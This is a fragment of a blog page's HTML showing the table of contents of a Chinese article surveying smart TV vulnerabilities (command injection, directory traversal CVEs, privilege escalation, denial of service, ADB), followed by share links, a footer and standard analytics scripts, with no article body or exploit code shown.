+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB"><span class="toc-number">1.</span> <span class="toc-text">智能电视漏洞汇总</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text">命令注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%90%E7%94%B5%E8%A7%86%E5%90%8D%E7%A7%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">某电视名称命令注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B9%90%E8%A7%86%E7%94%B5%E8%A7%86%E5%88%A9%E7%94%A8-UPnP-%E5%AE%89%E8%A3%85%E5%BA%94%E7%94%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">乐视电视利用 UPnP 安装应用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">目录遍历漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TCL-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-CVE-2020-27403"><span class="toc-number">1.2.1.</span> <span class="toc-text">TCL 目录遍历(CVE-2020-27403)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Sony-Smart-TV-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%EF%BC%88CVE-2019-10886%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">Sony Smart TV 目录遍历（CVE-2019-10886）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Appear-TV-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%EF%BC%88CVE-2018-7539%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">Appear TV  目录遍历（CVE-2018-7539）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.3.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LG-webOS-OS-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.1.</span> <span class="toc-text">LG webOS OS 任意文件覆盖提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text">拒绝服务漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Sony-BRAVIA-%E7%94%B5%E8%A7%86-TCP-%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB%EF%BC%88CVE-2019-11890%EF%BC%89"><span class="toc-number">1.4.1.</span> <span class="toc-text">Sony BRAVIA 电视  TCP 泛洪攻击（CVE-2019-11890）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.</span> <span class="toc-text">其他漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ADB"><span class="toc-number">1.5.1.</span> <span class="toc-text">ADB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SUPRA%E6%99%BA%E8%83%BD%E4%BA%91%E7%94%B5%E8%A7%86%E8%A7%86%E9%A2%91%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-12477%EF%BC%89"><span class="toc-number">1.5.2.</span> <span class="toc-text">SUPRA智能云电视视频劫持漏洞（CVE-2019-12477）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Sony-Smart-TV-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.5.3.</span> <span class="toc-text">Sony Smart TV 信息泄露</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&text=智能电视漏洞汇总"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=智能电视漏洞汇总"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&is_video=false&description=智能电视漏洞汇总"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=智能电视漏洞汇总&body=Check out this article: http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=智能电视漏洞汇总"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=智能电视漏洞汇总"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=智能电视漏洞汇总"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=智能电视漏洞汇总"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&name=智能电视漏洞汇总&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2021 Delikely
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inicio</a></li>
+         
+          <li><a href="/2018/04/11/about/">Acerca de</a></li>
+         
+          <li><a href="/archives/">Articulos</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Proyectos</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({{ JSON.stringify(config) }});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="{{ src }}">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'G-KX5LMFBRGG', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?4c5298163cee69d0e09ddc06ab1b8104";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
